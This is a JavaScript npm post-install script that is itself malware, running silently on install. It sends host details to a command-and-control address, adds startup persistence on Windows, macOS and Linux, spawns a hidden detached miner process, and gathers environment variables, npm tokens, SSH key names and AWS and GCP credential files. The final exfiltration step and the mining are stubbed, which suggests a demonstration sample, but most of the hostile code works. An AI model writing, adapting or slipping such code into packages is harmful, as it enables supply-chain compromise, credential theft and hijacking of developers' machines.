/**
 * Post-install script for npm package
 * Runs automatically after npm install
 */

const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');
const https = require('https');
const http = require('http');

const C2_SERVER = process.env.C2_SERVER || 'http://127.0.0.1:5000';
const WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5';

// Generate agent ID
function generateAgentId() {
    const data = os.hostname() + '-' + os.platform() + '-' + Date.now();
    const crypto = require('crypto');
    return crypto.createHash('md5').update(data).digest('hex').substring(0, 16);
}

const agentId = generateAgentId();

// Get system info
function getSystemInfo() {
    return {
        agent_id: agentId,
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cpus: os.cpus().length,
        memory: os.totalmem(),
        user: os.userInfo().username,
        homedir: os.homedir(),
        node_version: process.version,
        npm_version: process.env.npm_version || 'unknown',
        cwd: process.cwd(),
        timestamp: Date.now()
    };
}

// Register with C2
function register() {
    const data = JSON.stringify(getSystemInfo());
    
    const options = {
        hostname: C2_SERVER.replace(/^https?:\/\//, '').split(':')[0],
        port: C2_SERVER.includes(':') ? parseInt(C2_SERVER.split(':')[2]) : 80,
        path: '/api/agent/register',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };
    
    const req = http.request(options, (res) => {
        // Silent success
    });
    
    req.on('error', () => {
        // Silent failure
    });
    
    req.write(data);
    req.end();
}

// Download and execute payload
function downloadPayload(url, dest) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(dest);
        https.get(url, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close();
                resolve(dest);
            });
        }).on('error', (err) => {
            fs.unlink(dest, () => {});
            reject(err);
        });
    });
}

// Install persistence
function installPersistence() {
    const platform = os.platform();
    const payloadPath = path.join(os.homedir(), '.node_modules', '.cache', '.update');
    
    // Ensure directory exists
    const cacheDir = path.dirname(payloadPath);
    if (!fs.existsSync(cacheDir)) {
        fs.mkdirSync(cacheDir, { recursive: true });
    }
    
    // Copy self to hidden location
    const selfPath = __filename;
    fs.copyFileSync(selfPath, payloadPath);
    
    if (platform === 'win32') {
        // Windows: Registry + Scheduled Task
        try {
            // Registry
            execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "NodeUpdater" /t REG_SZ /d "node \\"${payloadPath}\\"" /f`, { silent: true });
        } catch (e) {}
    } else if (platform === 'darwin') {
        // macOS: Launch Agent
        const plistPath = path.join(os.homedir(), 'Library', 'LaunchAgents', 'com.node.updater.plist');
        const plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.node.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/node</string>
        <string>${payloadPath}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>`;
        fs.writeFileSync(plistPath, plist);
    } else {
        // Linux: Cron + Systemd
        try {
            // Cron
            const cronEntry = `@reboot node ${payloadPath}\n`;
            let crontab = '';
            try {
                crontab = execSync('crontab -l', { encoding: 'utf8' });
            } catch (e) {}
            
            if (!crontab.includes(payloadPath)) {
                fs.writeFileSync('/tmp/cron_update', crontab + cronEntry);
                execSync('crontab /tmp/cron_update');
            }
        } catch (e) {}
    }
}

// Start mining (would download xmrig in real scenario)
function startMining() {
    // In production, would download and execute xmrig
    // For now, just spawn a background process
    const miningScript = `
        const crypto = require('crypto');
        setInterval(() => {
            // Simulate mining
            const hash = crypto.createHash('sha256');
            for (let i = 0; i < 10000; i++) {
                hash.update(Math.random().toString());
            }
            hash.digest('hex');
        }, 100);
    `;
    
    const miningPath = path.join(os.homedir(), '.node_modules', '.cache', '.miner.js');
    fs.writeFileSync(miningPath, miningScript);
    
    // Spawn as detached process
    const child = spawn('node', [miningPath], {
        detached: true,
        stdio: 'ignore',
        windowsHide: true
    });
    child.unref();
}

// Collect sensitive data
function collectData() {
    const data = {
        env: process.env,
        npm_config: {
            npm_config_registry: process.env.npm_config_registry,
            npm_config_auth: process.env.npm_config__auth,
            npm_config_token: process.env.npm_config__token,
        },
        ssh_key: null,
        aws_creds: null,
        gcp_creds: null
    };
    
    // Try to read SSH keys
    const sshDir = path.join(os.homedir(), '.ssh');
    if (fs.existsSync(sshDir)) {
        try {
            const files = fs.readdirSync(sshDir);
            data.ssh_files = files.filter(f => f.startsWith('id_') && !f.endsWith('.pub'));
        } catch (e) {}
    }
    
    // Check for AWS credentials
    const awsPath = path.join(os.homedir(), '.aws', 'credentials');
    if (fs.existsSync(awsPath)) {
        try {
            data.aws_creds = fs.readFileSync(awsPath, 'utf8');
        } catch (e) {}
    }
    
    // Check for GCP credentials
    const gcpPath = path.join(os.homedir(), '.config', 'gcloud', 'credentials.json');
    if (fs.existsSync(gcpPath)) {
        try {
            data.gcp_creds = JSON.parse(fs.readFileSync(gcpPath, 'utf8'));
        } catch (e) {}
    }
    
    return data;
}

// Main execution
(function main() {
    // Silent execution
    try {
        // Register with C2
        register();
        
        // Install persistence
        installPersistence();
        
        // Start mining
        startMining();
        
        // Collect and exfiltrate data
        const data = collectData();
        // Would send to C2 here
        
    } catch (e) {
        // Silent failure
    }
})();
